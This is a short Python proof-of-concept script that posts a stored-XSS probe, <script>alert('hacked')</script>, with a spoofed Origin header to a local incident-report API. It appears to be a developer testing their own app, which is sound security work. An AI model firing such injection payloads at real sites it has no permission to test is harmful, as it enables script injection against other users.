# xss_attack.py
import requests

url = "http://localhost:3000/api/incidents/report"
headers = {
    "Content-Type": "application/json",
    "Origin": "http://localhost:3001",
    "User-Agent": "XSS-Attacker/1.0",
    # "Authorization": "Bearer <your_token>"  # Uncomment if auth is required
}
payload = {
    "title": "XSS Test",
    "description": "<script>alert('hacked')</script>"
}

response = requests.post(url, json=payload, headers=headers)
print("Status Code:", response.status_code)
print("Response:", response.json())
